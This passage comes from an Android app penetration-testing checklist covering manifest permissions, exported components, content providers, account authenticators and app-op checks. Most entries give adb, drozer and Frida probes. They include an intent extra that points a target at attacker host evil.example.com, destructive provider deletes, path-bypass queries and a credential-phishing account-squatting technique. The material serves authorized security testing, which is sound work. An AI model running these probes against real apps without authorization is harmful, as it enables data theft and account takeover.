- **Test:** Cross-reference every dangerous permission the app holds against the exported components that surface that data or perform that action. An exported component that does permission-gated work with attacker-supplied parameters lets a zero-permission app borrow the grant — INTERNET, CONTACTS, LOCATION, CAMERA, SMS, CALL_LOG.
- **How:**
  ```bash
  aapt2 dump permissions base.apk | sed 's/^.*name=//' | sort
  adb shell dumpsys package $PKG | sed -n '/requested permissions/,/install permissions/p'
  # find the consumers
  grep -rnE 'ContactsContract|CallLog\.Calls|Telephony\.Sms|CalendarContract|AccountManager\(|getAccounts\(|LocationManager|FusedLocationProviderClient|SmsManager' sources/
  # then, from the ZERO-permission PoC app:
  adb shell content query --uri content://com.target.contacts
  adb shell am start -n com.target/.ExportedActivity --es server evil.example.com
  ```
  The ok.ru shape passed an attacker-supplied host into a REST builder:
  ```java
  new RestApiMethodBuilder(holder, HttpMethodType.GET)
      .setTargetUrl(new URI("http://" + this.server + "/", false));   // this.server came from the Intent
  ```
- **Proof:** `content query` from a package holding **no** runtime permissions returning rows the platform would have gated behind `READ_CONTACTS`/`READ_SMS`/`ACCESS_FINE_LOCATION`; or your own server's access log showing a request bearing the victim app's User-Agent. State in the report that the PoC manifest requests no permissions and show the `dumpsys` proof.
- **Escalation:** Direct PII exfiltration -> D20; SMS/contacts -> OTP interception and ATO (D13/D24); INTERNET from a zero-permission app is a platform-model break in its own right.
- **Ruled out when:** Every exported component that touches a permission-gated API first calls `checkCallingPermission()` (or `checkPermission(perm, Binder.getCallingPid(), Binder.getCallingUid())`) for the *same* permission, with a deny branch that returns before the work — and you have confirmed that from the zero-permission PoC app receiving a `SecurityException`.

### D03-032 · `android:permission` on `<application>` silently **overridden**, not supplemented, by a per-component value

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 / AM-04 |
| **Applies to** | all |
| **Maps to** | `developer.android.com/guide/topics/manifest/service-element`, `.../receiver-element` — if `android:permission` is unset on the component, the `<application>` element's value applies; if neither is set *"the service isn't protected by a permission"*; MobSF `exported_protected_permission_normal_app_level`, `exported_protected_permission_not_defined_app_level` |

- **Test:** Developers set `android:permission` once on `<application>` and believe it is a floor. It is not — a per-component `android:permission` **replaces** it. One component declaring a weaker (or orphan, or misspelled) permission silently drops out of the application-wide guard.
- **How:**
  ```bash
  grep -n -A3 '<application' merged.xml | grep -i permission
  grep -nE '<(service|receiver|activity|activity-alias|provider)[^>]*android:(permission|readPermission|writePermission)' merged.xml
  ```
  Then resolve each per-component value's protection level via D03-009's cross-join and compare it with the application-level one.
- **Proof:** A component whose own `android:permission` resolves to a weaker level (or to nothing) while `<application>` carries a stronger one, plus an invocation succeeding while holding only the weaker permission.
- **Escalation:** -> D05 (receiver), D06 (service). Frequently the single surviving entry point on an otherwise well-guarded app.
- **Ruled out when:** No component declares its own `android:permission`, or every one that does resolves to a level at least as strong as the `<application>` value, confirmed on-device by D03-005.

### D03-033 · `<activity-alias>` inherits nothing from its target

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `developer.android.com/guide/topics/manifest/activity-alias-element` — *"with the exception of `targetActivity`, `<activity-alias>` attributes are a subset of `<activity>` attributes. For attributes in the subset, none of the values set for the target carry over to the alias"*, and the alias's `android:permission` *"supplants any permission set for the target activity itself"*; MASTG-TECH-0160 — *"activity aliases have their own `android:exported`, `android:permission`, and intent filters, so review them separately from the target activity"* |

- **Test:** An alias can be `exported="true"` with no `android:permission` while its `targetActivity` is `exported="false"` and permission-protected. Tooling and developers both routinely skip aliases.
- **How:**
  ```bash
  xmllint --format merged.xml | grep -n -A10 '<activity-alias'
  # launch the ALIAS name, not the target
  adb shell am start -n com.target.app/.AliasName
  adb shell am start -n com.target.app/.InternalActivity    # control: expect Permission Denial
  # drozer
  #   run app.activity.start --component com.target.app com.target.app.AliasName
  ```
- **Proof:** The target activity's UI appearing after launching the *alias* class name, while launching the target class name directly returns `java.lang.SecurityException: Permission Denial`. That delta is the whole finding.
- **Escalation:** Whatever the internal activity does, now reachable unauthenticated -> D04 parameter tampering, D08 intent redirection.
- **Ruled out when:** No `<activity-alias>` exists, or every alias carries `android:exported="false"`, or carries the same `android:permission` as its target (verified to be an enforceable level under D03-005).

### D03-034 · `android:exported="true"` written to satisfy the targetSdk 31 build

| | |
|---|---|
| **Severity ceiling** | **High** (Critical when the component performs an authenticated state change) |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | **targetSdk 31+.** LEGACY below 31, where the *absence* of the attribute on an intent-filtered component is the bug instead (see D03-003). |
| **Maps to** | `developer.android.com/about/versions/12/behavior-changes-12#exported` — *"safer component exporting ... app cannot install on Android 12+ devices without this attribute"*; `developer.android.com/privacy-and-security/risks/android-exported` (MASVS-PLATFORM) |

- **Test:** Since Android 12 an intent-filtered component cannot install without an explicit `android:exported`. The pre-12 bug class ("forgot to set it") is dead on modern targets; the live class is "wrote `true` to make the build pass, on a component that was never meant to be public". Demand a cross-app justification for every `true`.
- **How:**
  ```bash
  grep -nB2 -A8 'android:exported="true"' merged.xml
  # probe each, both bare and with the filter's action
  adb shell am start -n com.target.app/.SomeActivity
  adb shell am start -a com.target.ACTION_X -n com.target.app/.SomeActivity --es token AAA
  adb shell am startservice -n com.target.app/.SomeService
  adb shell am broadcast -n com.target.app/.SomeReceiver --es payload AAA
  ```
  Then classify each reachable component by sink: does it accept extras that flow into a WebView (-> D10), a URI extra (-> SSRF-via-deep-link), or an `Intent` it forwards (-> D08)?
- **Proof:** A component that renders authenticated content or transitions state when launched from the zero-permission PoC app — the side effect captured, not the launch status (see the Body-Diff note in D03-007).
- **Escalation:** D04/D05/D06/D07 by component type; D08 if it forwards.
- **Ruled out when:** Every `exported="true"` component has a documented cross-app contract (a launcher entry, a share target, a platform-delivered filter such as `USB_DEVICE_ATTACHED`, an OS-invoked service) **and** either carries an enforceable `android:permission` or does nothing privileged with attacker-supplied extras — proven by driving it with hostile extras from the PoC app and observing no state change.

### D03-035 · `android:path` used where `pathPrefix` was meant — the subtree is unguarded

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | QARK plugin `qark/plugins/manifest/android_path.py` — *"`android:path` means that the permission applies to the exact path declared in `android:path`. This expression does not protect the sub-directories"* |

- **Test:** `android:path` matches the **exact** path only. A provider whose permission is scoped with `android:path` leaves every child URI ungated.
- **How:**
  ```bash
  grep -n 'android:path=' merged.xml
  # probe the children of each declared path from the zero-permission PoC app
  adb shell content query --uri content://com.target.provider/protected            # expect denial
  adb shell content query --uri content://com.target.provider/protected/child      # the gap
  adb shell content query --uri content://com.target.provider/protected/1
  ```
- **Proof:** `content query` on `…/protected/child` returning rows while `…/protected` is denied — the pair of outputs proves the guard does not cover the subtree.
- **Escalation:** -> D07 provider data extraction.
- **Ruled out when:** Every path-scoped element uses `pathPrefix` or `pathPattern` with coverage you have verified by probing at least three children and one sibling of each declared path, all denied.

### D03-036 · `<path-permission>` coverage gap and `<grant-uri-permission>` scoped to the whole provider

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `developer.android.com/guide/topics/manifest/provider-element` (`<path-permission>` is path-scoped and takes precedence over the provider-level permission; `<grant-uri-permission>` names the URI subsets grantable when `grantUriPermissions="false"`); MobSF `improper_provider_permission` (raised for `pathPrefix="/"`, `path="/"`, `path="*"`) |

- **Test:** Two halves. (a) Any path **not** matched by a `<path-permission>` falls back to the provider-level permission — and if that is absent, to nothing. Path matching supports `path`, `pathPrefix`, `pathPattern`, `pathSuffix`, `pathAdvancedPattern`; normalisation variants slip past them. (b) `<grant-uri-permission android:pathPrefix="/">` (or `path="/"`, `pathPattern="*"`) converts a narrow, single-URI grant into whole-provider access for anyone who receives any grant.
- **How:**
  ```bash
  xmllint --format merged.xml | sed -n '/<provider/,/<\/provider>/p'
  grep -B3 -A3 'grant-uri-permission' merged.xml
  # for each <path-permission>, find a URI it does NOT match but the provider still serves
  adb shell content query --uri content://AUTH/protected            # expect denial
  adb shell content query --uri content://AUTH//protected           # double slash
  adb shell content query --uri content://AUTH/./protected
  adb shell content query --uri content://AUTH/PROTECTED            # case
  adb shell content query --uri content://AUTH/protected/../protected
  ```
- **Proof:** One normalisation variant returning rows while the canonical path returns `Permission Denial` — the pair of outputs is the finding. For (b): the PoC app receives a grant for one benign URI and then successfully `openInputStream()`s an unrelated URI under the same authority.
- **Escalation:** -> D07 full provider read; -> D08, where an over-broad `grant-uri-permission` is the multiplier that turns a single intent redirect into "read anything the app can read".
- **Ruled out when:** Every `<grant-uri-permission>` names a specific `pathPrefix` narrower than `/`, and every `<path-permission>`-covered path denies all five normalisation variants above.

### D03-037 · Provider declares `readPermission` but omits `writePermission`

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | Oversecured, "Content Providers and the potential weak spots they can have" — weakness #3, permission declaration mismatches |

- **Test:** Splitting `android:readPermission` and `android:writePermission` creates a gap: a provider that declares only a read permission accepts `insert`/`update`/`delete` from any app. It gets worse when the implementation ignores the requested access mode.
- **How:**
  ```bash
  grep -E '<provider' -A8 merged.xml | grep -E 'authorities|readPermission|writePermission|exported|grantUriPermissions'
  adb shell content insert --uri content://com.target.provider/items --bind name:s:pwnedmarker7x
  adb shell content delete --uri content://com.target.provider/items --where "1=1"
  adb shell content query  --uri content://com.target.provider/items
  ```
- **Proof:** The `insert`/`delete` returning without a `SecurityException`, and a subsequent read (or the app's own UI) showing the mutated row carrying your 8+ character random marker. Search the **baseline** for that marker first — a value that already existed is not your write.
- **Escalation:** Write into a table the app later renders in a WebView (stored XSS inside the app's WebView -> D10) or concatenates into SQL (second-order SQLi -> D07).
- **Ruled out when:** Every exported provider declares both `readPermission` and `writePermission` at an enforceable level, or declares a single `android:permission` covering both, and the `insert`/`delete` probes return `Permission Denial`.

### D03-038 · `android:process` with a global name, and missing `isolatedProcess` on untrusted-input services

| | |
|---|---|
| **Severity ceiling** | Medium — an enabler; the High lives in whatever runs inside the collapsed boundary (D16) |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-08 |
| **Applies to** | all |
| **Maps to** | `developer.android.com/guide/topics/manifest/service-element`, `.../activity-element`, `.../receiver-element` (`android:process`, `android:isolatedProcess` — documented as running *"under a special isolated process with no permissions of its own"*) |

- **Test:** An `android:process` value beginning with a lowercase letter (no leading `:`) puts the component in a **global** shared process; components from different apps sharing a global process share an address space. A `:`-prefixed value is private. Separately, a service that parses untrusted input (media, archives, model files) and does **not** set `isolatedProcess="true"` runs that parser with the app's full permission set.
- **How:**
  ```bash
  grep -nE 'android:process="' merged.xml
  grep -nE 'android:isolatedProcess' merged.xml
  adb shell ps -A | grep com.target        # one line per process; compare names across packages
  adb shell ps -Z | grep com.target        # SELinux context per process
  ```
- **Proof:** A process name with no leading `:` shared between two packages in `ps -A` output; or a native parser service running in the main process (`ps -A` showing a single PID) while handling attacker-supplied bytes.
- **Escalation:** A compromise in the less-trusted component now runs in the more-trusted one's process -> D16 native memory safety with the app's full grant set. Combined with `sharedUserId` (D03-061) it is code from app B executing inside app A's process.
- **Ruled out when:** Every `android:process` value is either absent or `:`-prefixed, and every service that parses untrusted input declares `android:isolatedProcess="true"`.

### D03-039 · `android:directBootAware="true"` — components that run before the user unlocks

| | |
|---|---|
| **Severity ceiling** | **High** (when the pre-unlock data is auth material) |
| **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) as the storage node — file it as the *reachability at a lower unlock state*, chaining to `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if it is a live credential |
| **Attacker** | AM-10 (physical locked — this is the whole point) |
| **Applies to** | all; default is `"false"` on activities, services, receivers and providers |
| **Maps to** | `developer.android.com/guide/topics/manifest/{activity,service,receiver,provider}-element` (`android:directBootAware`) |

- **Test:** A Direct-Boot-aware component can run before the user unlocks and can only touch *device-protected* storage during Direct Boot. A `directBootAware` component that reads credentials therefore implies those credentials live outside the file-based-encryption credential key.
- **How:**
  ```bash
  grep -nE 'directBootAware="true"' merged.xml
  grep -rnE 'createDeviceProtectedStorageContext|moveSharedPreferencesFrom|moveDatabaseFrom|isUserUnlocked' sources/
  # on a rooted lab device, before unlock:
  adb shell ls -la /data/user_de/0/com.target.app/
  adb shell cat /data/user_de/0/com.target.app/shared_prefs/*.xml
  ```
- **Proof:** A `directBootAware` component plus a `createDeviceProtectedStorageContext()` write of a token or key, read back from `/data/user_de/0/<pkg>/` **before** the device is unlocked.
- **Escalation:** -> D11 (pre-unlock credential extraction), D13 (session takeover from a locked device).
- **Ruled out when:** No component declares `directBootAware="true"`; or the device-protected storage context is used only for non-sensitive bootstrapping (a locale, a feature flag) and `/data/user_de/0/<pkg>/` contains no credential material at the pre-unlock state.

### D03-040 · Context-registered receivers are invisible to manifest analysis — and `RECEIVER_NOT_EXPORTED` is mandatory from API 33

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all; the `RECEIVER_EXPORTED`/`RECEIVER_NOT_EXPORTED` requirement applies to apps targeting **Android 13 (API 33)+** for non-system broadcasts |
| **Maps to** | MASTG-TECH-0162, verbatim: *"receivers created at runtime are registered by calling `Context.registerReceiver` ... search the reverse-engineered code for calls to `registerReceiver` and for subclasses of `BroadcastReceiver` ... check whether the call specifies `RECEIVER_NOT_EXPORTED`, which since Android 13 (API level 33) prevents other apps from delivering broadcasts to the receiver"* |

- **Test:** Receivers created with `Context.registerReceiver` appear in neither the manifest nor `drozer app.broadcast.info`. A D03-003 table built from the manifest alone is incomplete by exactly this set.
- **How:**
  ```bash
  grep -rnE 'registerReceiver|RECEIVER_NOT_EXPORTED|RECEIVER_EXPORTED' sources/
  ```
  Runtime enumeration:
  ```
  objection -g com.target.app explore
  android hooking list receivers
  ```
  ```javascript
  Java.perform(function () {
    var C = Java.use('android.app.ContextImpl');   // NOT android.content.Context — that is abstract
    C.registerReceiver.overloads.forEach(function (o) {
      o.implementation = function () {
        console.log('[registerReceiver] argc=' + arguments.length + ' filter=' + arguments[1]);
        return o.apply(this, arguments);
      };
    });
  });
  ```
- **Proof:** A `registerReceiver` call logged with an app-specific `IntentFilter` action and **no** `RECEIVER_NOT_EXPORTED` flag on an API 33+ target, then `adb shell am broadcast -a <action> --es key value` from the PoC app reaching it and producing the observed state change.
- **Escalation:** -> D05 broadcast injection. Runtime receivers handling session refresh, config update or payment confirmation on attacker-supplied extras are the payable shape.
- **Ruled out when:** Every `registerReceiver` call on an API 33+ target passes `RECEIVER_NOT_EXPORTED`, or registers only protected system broadcasts, or uses `LocalBroadcastManager`/the app's own `ContextCompat.registerReceiver` with the not-exported flag.

### D03-041 · Dialler secret-code receivers (`android.provider.Telephony.SECRET_CODE`)

| | |
|---|---|
| **Severity ceiling** | **High** (when the screen exposes logs, tokens, or toggles a security control) |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 (broadcast it programmatically) / AM-02 (social-engineer the user into dialling) |
| **Applies to** | all; yield is highest on OEM/carrier builds |
| **Maps to** | drozer `scanner.misc.secretcodes`; HackTricks drozer tutorial |

- **Test:** A `SECRET_CODE` receiver exposes app functionality to anyone who can type `*#*#<code>#*#*` into the dialler — usually engineering menus, log dumps or factory-test screens. It is also reachable as an ordinary broadcast.
- **How:**
  ```bash
  grep -n -A6 'android.provider.Telephony.SECRET_CODE' merged.xml
  # drozer
  #   run scanner.misc.secretcodes com.target.app
  adb shell am broadcast -a android.provider.Telephony.SECRET_CODE -d android_secret_code://12345
  ```
- **Proof:** The broadcast opening an engineering/debug screen, or writing a diagnostic file containing device identifiers, logs or credentials — screenshot plus the file contents.
- **Escalation:** Combine with tapjacking (D04) to get the user to dial it, or with an exported proxy component to fire the broadcast from an attacker app -> D05.
- **Ruled out when:** No receiver declares the `SECRET_CODE` action, or the reachable screen renders only static build metadata already published in the app's About page.

### D03-042 · Accessory intent filters (USB / NFC) — exported by necessity, therefore audit them as exported components

| | |
|---|---|
| **Severity ceiling** | **High** (Low if it only crashes) |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); the crash-only case is `application_level_denial_of_service_dos.app_crash.malformed_android_intents` (**P5**) |
| **Attacker** | AM-03 (forge the intent from an app) / AM-10–AM-11 (present the physical device or tag) |
| **Applies to** | apps declaring `USB_DEVICE_ATTACHED`, `USB_ACCESSORY_ATTACHED` or `NDEF_DISCOVERED` |
| **Maps to** | `developer.android.com/develop/connectivity/usb/host` (the `<action android:name="android.hardware.usb.action.USB_DEVICE_ATTACHED"/>` + `<meta-data>` pattern); `developer.android.com/develop/connectivity/nfc/nfc` (the three dispatch actions); `developer.android.com/privacy-and-security/risks/android-exported` |

- **Test:** An activity carrying these filters **must** be exported — the system delivers the intent — and usually carries no `android:permission`. Testers skip them because they look like hardware plumbing, but a zero-permission app can `am start` them with forged extras.
- **How:**
  ```bash
  grep -n -B4 -A10 'USB_DEVICE_ATTACHED\|USB_ACCESSORY_ATTACHED\|NDEF_DISCOVERED\|TECH_DISCOVERED\|TAG_DISCOVERED' merged.xml
  adb shell am start -a android.hardware.usb.action.USB_DEVICE_ATTACHED -n com.target.app/.UsbActivity
  adb shell am start -a android.nfc.action.NDEF_DISCOVERED -n com.target.app/.NfcActivity --es payload 'A'
  # does the handler trust the parcelable without a null check, and where does the payload go?
  grep -rnE 'UsbManager\.EXTRA_(DEVICE|ACCESSORY|PERMISSION_GRANTED)|NfcAdapter\.EXTRA_(TAG|NDEF_MESSAGES|ID)' sources/ -A10
  ```
- **Proof:** The activity starting and processing your forged extras from the zero-permission PoC app — the handler's own log line in logcat, or a crash stack proving an unchecked `getParcelableExtra()`, or the NDEF payload appearing as a URI in a router/WebView/file sink.
- **Escalation:** -> D09 if the payload is a URI reaching a deep-link router; -> D10 if it reaches a WebView; -> D25 for accessory-driven chains. Crash-only stays P5 — say so.
- **Ruled out when:** No accessory filters are declared, or the handler null-checks every parcelable extra **and** validates the device/tag identity (vendor/product id, tag UID) before acting, with the validation demonstrably refusing your forged intent.

### D03-043 · Account-type squatting against `AbstractAccountAuthenticator`

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) once harvested credentials complete an ATO; the primitive alone files under `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 (install order matters — demonstrate it and state it) |
| **Applies to** | all Android versions for the squatting itself |
| **Maps to** | `developer.android.com/about/versions/oreo/android-8.0-changes`, verbatim: *"in Android 8.0 (API level 26), apps can no longer get access to user accounts unless the authenticator owns the accounts or the user grants that access. The `GET_ACCOUNTS` permission is no longer sufficient."* — which is exactly why owning the *type* is the prize |

- **Test:** If the app declares an account authenticator, the `android:accountType` string is claimed **first-installer-wins** and is not signature-bound by the manifest alone. A malicious app declaring the same type and installed first owns it: the target's `AccountManager.addAccount(type, …)` routes to the attacker's authenticator activity, which renders a pixel-perfect login **inside the target's own task** — no overlay, so `FLAG_SECURE` and overlay-hiding do not help.
- **How:**
  ```bash
  grep -rn 'accountType\|AbstractAccountAuthenticator\|account-authenticator' merged.xml out/res/xml/ sources/
  cat out/res/xml/authenticator.xml
  adb shell dumpsys account | grep -A5 '<the account type>'
  ```
  Attacker app: copy `authenticator.xml` verbatim (same `accountType`, `label`, `icon`), install it first, then trigger the target's sign-in flow or call from a third app:
  ```java
  AccountManager.get(ctx).addAccount("<type>", null, null, null, activity, cb, null);
  ```
- **Proof:** `dumpsys account` attributing the account type to the attacker package, plus a screenshot of the attacker's activity rendered when the target app's "sign in" is tapped.
- **Escalation:** Harvested credentials -> D13 full ATO. The attacker authenticator can also return a `KEY_INTENT` launching an arbitrary component in the caller's context -> D08 intent redirection.
- **Ruled out when:** The app declares no `<account-authenticator>`; or installing the squatter first causes the target's own authenticator to win (`dumpsys account` still names the target) on every API level in the app's range. Record the install order in the PoC — triage will ask.

### D03-044 · `android:intentMatchingFlags` — `"none"` is an explicit opt-*out* of Android 16 intent hardening

| | |
|---|---|
| **Severity ceiling** | **High** (when the exempt component routes an arbitrary URI); Medium standalone |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | **Android 16 (API 36)+.** Settable on `<application>`, `<activity>`, `<activity-alias>`, `<receiver>`, `<service>`, `<provider>`. |
| **Maps to** | `developer.android.com/about/versions/16/behavior-changes-16` — values `enforceIntentFilter` / `none` / `allowNullAction`; the documented logcat filter is `tag:PackageManager & (message:"Intent does not match component's intent filter:" | message:"Access blocked:")` |

- **Test:** Three sub-cases. (a) `intentMatchingFlags="none"` **disables all special matching rules and takes precedence** — a component carrying it is explicitly de-hardened. (b) `allowNullAction` re-permits action-less intents. (c) A manifest can set `enforceIntentFilter` on `<application>` and look hardened while one externally reachable component sets `none`, restoring pre-16 behaviour for that component only — that component is then the single surviving entry point on an otherwise hardened app.
- **How:**
  ```bash
  grep -nE 'intentMatchingFlags' merged.xml
  # send an explicit intent that does NOT match the declared filter
  adb shell am start -W -n com.target/.EntryActivity -a com.attacker.UNEXPECTED -d 'https://wrong.example/'
  adb shell am start -W -n com.target/.EntryActivity          # null action
  adb shell am broadcast -n com.target.app/.MyBroadcastReceiver --es payload pwnmark7x
  adb logcat -s PackageManager | grep -E "Intent does not match component's intent filter:|Access blocked:"
  ```
- **Proof:** With strict matching in force the framework blocks the call and `PackageManager` logs `Intent does not match component's intent filter:` (observed on-device as `result code=-92 / Access blocked`); with `none` the handler's `onReceive`/`onCreate` runs and the block message is **absent** (`result code=3 / delivered`). The pair of logcat outputs, taken on the same device, is the evidence.
- **Escalation:** Route every D08 payload through the exempt component. Absence of `enforceIntentFilter` on an exported component that forwards `getIntent()` data is the defence-in-depth half — on its own it is Low, but it is what lets a local app inject an arbitrary URI (any host, `javascript:`, `data:`) into a Flutter/React Native `MainActivity` router that a browser could only reach through autoVerify'd hosts -> D09 -> D10.
- **Ruled out when:** The target is below API 36 (the attribute has no effect — say so rather than reporting its absence), or `<application>` sets `enforceIntentFilter` and **no** component overrides it with `none`/`allowNullAction`, confirmed by the block message appearing for every mismatched explicit intent you send. **Sibling comparison is the strongest argument here:** a sibling app in the same family that sets `enforceIntentFilter` proves the absent one is a defect, not a design choice.

### D03-045 · `resolveActivity() == null` used as a security gate — the package-visibility trap

| | |
|---|---|
| **Severity ceiling** | **High** |
| **VRT** | `broken_access_control.privilege_escalation` (null); rate on the control the gate protects |
| **Attacker** | AM-03 |
| **Applies to** | **targetSdk 30+ only.** Below 30 these calls are unfiltered and the gate works — this is a bug that *appears* when the app raises its target SDK, which is why it survives old checklists. |
| **Maps to** | `developer.android.com/training/package-visibility` (filtering of `queryIntentActivities`, `getPackageInfo`, `getInstalledApplications`, and service binding); MASWE-0047 (Using Non-Standard APIs for Security-Critical Functionality) |

- **Test:** A very common modern pattern: the app decides whether a competitor, clone, root manager, overlay app or official companion is present using `resolveActivity()`, `queryIntentActivities()`, `getPackageInfo()` or `getInstalledApplications()`, and takes the *secure* branch only when the result is non-empty. Since targetSdk 30 those APIs are filtered and return null/empty for packages not covered by `<queries>`. An attacker that simply stays outside the app's `<queries>` declaration forces the "nothing found" branch. The inverse also holds: a check that treats "nothing else resolves" as proof of safety is defeated by an attacker who *does* declare a matching filter.
- **How:**
  ```bash
  grep -rnE 'resolveActivity|resolveService|queryIntentActivities|queryBroadcastReceivers|getInstalledPackages|getInstalledApplications|getPackageInfo\(' sources/ \
    | grep -inE 'null|isEmpty|size\(\)\s*==\s*0'
  adb shell dumpsys package $PKG | sed -n '/queries/,/^$/p'
  grep -n -A20 '<queries>' merged.xml
  ```
  Then diff on-device: run the app once with the package it intends to detect installed, and once without.
- **Proof:** The branch `if (resolveActivity(...) == null) { /* trust path */ }` in decompiled code, the absence of a `<queries>` entry that would make the checked package visible, and a demonstration that installing the package the app intends to detect **still** leaves the app on the trust path.
- **Escalation:** These checks almost always gate a second control — root/clone detection, "is a browser installed", "is the official companion present", a chooser, an attestation. Whatever that control is, it is now bypassed. Chains into D05 implicit-intent hijack: "safe because nothing else resolves" is exactly what a priority-999 component defeats.
- **Ruled out when:** The app's `targetSdk` is below 30 (the calls are unfiltered — state it); or every security-relevant visibility query is backed by a matching `<queries><package>` / `<queries><intent>` entry, **and** the gate fails closed (an empty result takes the *restrictive* branch, not the permissive one).

### D03-046 · `QUERY_ALL_PACKAGES` and over-broad `<queries>` — and using `<queries><package>` to remove your own PoC's precondition

| | |
|---|---|
| **Severity ceiling** | **Medium** as a privacy finding; Support in its far more valuable role as a precondition remover |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (varies) for the collection half; no dedicated node for the precondition half — file it with the parent finding |
| **Attacker** | AM-03 / AM-08 |
| **Applies to** | **targetSdk 30+.** Free package visibility below 30 (LEGACY) — on those targets this is not a finding. |
| **Maps to** | `developer.android.com/training/package-visibility`; MobSF/Play policy treatment of `QUERY_ALL_PACKAGES` as a restricted permission |

- **Test:** Two opposite uses. (a) The app holds `QUERY_ALL_PACKAGES` or a wildcard `<queries><intent>` block and ships the installed-app list off-device — undisclosed device fingerprinting, and worse when the list feeds a targeting decision ("if bank app installed, change behaviour"). (b) **For your own PoC:** declaring `<queries><package android:name="com.target.app"/>` requires no user consent and no permission, and it is what defeats the triager's "the attacker cannot discover the component" objection.
- **How:**
  ```bash
  grep -oE 'QUERY_ALL_PACKAGES' merged.xml
  grep -n -A20 '<queries>' merged.xml
  grep -rnE 'getInstalledPackages|getInstalledApplications|queryIntentActivities' sources/
  # attribute it: which AAR added QUERY_ALL_PACKAGES?
  grep -nE 'ADDED from|MERGED from' app/build/outputs/logs/manifest-merger-release-report.txt | grep -i QUERY_ALL
  ```
  In the PoC app's manifest, to remove the discovery precondition:
  ```xml
  <queries><package android:name="com.target.app"/></queries>
  ```
- **Proof:** (a) A Burp request body containing the full installed-package list going to a third-party host, with the merger report naming the SDK that requested the permission. (b) The PoC app resolving the target's components through `packageManager.queryIntentActivities()` while declaring only a `<queries><package>` entry, with no prompt shown.
- **Escalation:** (a) -> D18 SDK accountability, D20 data-safety mismatch; combined with D04 overlay work an installed-bank-app check is the precursor to targeted UI redress. (b) Removes the `AC:H` "attacker must know the component name" objection and moves the CVSS vector to `AC:L`, which on the FIRST bands is frequently one whole severity level.
- **Ruled out when:** (a) `QUERY_ALL_PACKAGES` is absent and every `<queries>` entry names a specific package or a narrow intent the app demonstrably needs, with no code path transmitting the resulting list. (b) n/a — this is your own tooling.

### D03-047 · App-op-gated special permissions fail open at `MODE_IGNORED`

| | |
|---|---|
| **Severity ceiling** | **High** (when the op gates a *defensive* feature that then fails open); Medium otherwise |
| **VRT** | `mobile_security_misconfiguration.tapjacking` (**P5**) when the failed-open control is an overlay guard — escalate through what the disabled defence permits |
| **Attacker** | AM-11 (to set the op) / AM-08 |
| **Applies to** | all; app-op modes are per-UID for security-relevant ops and per-package otherwise |
| **Maps to** | AOSP `AppOps.md` — modes `MODE_DEFAULT` / `MODE_ALLOWED` / `MODE_FOREGROUND` / `MODE_IGNORED` (*"deny access without throwing exceptions"*) / `MODE_ERRORED` (*"throw a `SecurityException` on access"*); *"certain permissions like `SYSTEM_ALERT_WINDOW` and `WRITE_SETTINGS` use the appop protection flag"*; shell syntax `appops set [--user USER_ID] PACKAGE OP MODE`, `appops get`, `appops reset`; AOSP `Permissions.md` checker flow (`MODE_ALLOWED` -> `PERMISSION_GRANTED`, `MODE_IGNORED` -> `PERMISSION_DENIED`, `MODE_DEFAULT` -> fall back to the grant state); `PROTECTION_FLAG_APPOP` = 0x40 |

- **Test:** For `appop`-flagged permissions (`SYSTEM_ALERT_WINDOW`, `WRITE_SETTINGS`, `MANAGE_EXTERNAL_STORAGE`, `REQUEST_INSTALL_PACKAGES`, `SCHEDULE_EXACT_ALARM`) the manifest declaration is necessary but the real decision lives in the app-op state, and a denial is **silent** — it does not throw. An app that checks only `checkSelfPermission()` mis-handles the revoked case; more importantly, a *security control* built on such a permission can be disabled by setting the op to `ignore`.
- **How:**
  ```bash
  adb shell appops set com.target.app SYSTEM_ALERT_WINDOW ignore
  adb shell appops set com.target.app WRITE_SETTINGS ignore
  adb shell appops get com.target.app
  adb shell dumpsys appops | sed -n '/com.target.app/,/^  Uid/p'
  ```
  Correct app-side checks to look for in jadx:
  ```bash
  grep -rnE 'Settings\.canDrawOverlays\(|Settings\.System\.canWrite\(|Environment\.isExternalStorageManager\(|canRequestPackageInstalls\(|canScheduleExactAlarms\(' sources/
  ```
- **Proof:** `dumpsys appops` showing the op at `ignore`, while the app's code path continues as if granted — no fallback branch taken, no user-visible error — captured in logcat or on screen. For the defensive case, the tamper warning or screenshot guard simply not appearing.
- **Escalation:** Fail-open defensive controls -> D21 (overlay/tapjacking not blocked), D04.
- **Ruled out when:** Every appop-gated capability is checked with its dedicated API (`canDrawOverlays`, `canWrite`, `isExternalStorageManager`, `canRequestPackageInstalls`, `canScheduleExactAlarms`) and the deny branch is observable — the feature visibly degrades or refuses when the op is set to `ignore`.

### D03-048 · Foreground-only permissions: probe the background path where the op flips to `MODE_IGNORED`

| | |
|---|---|
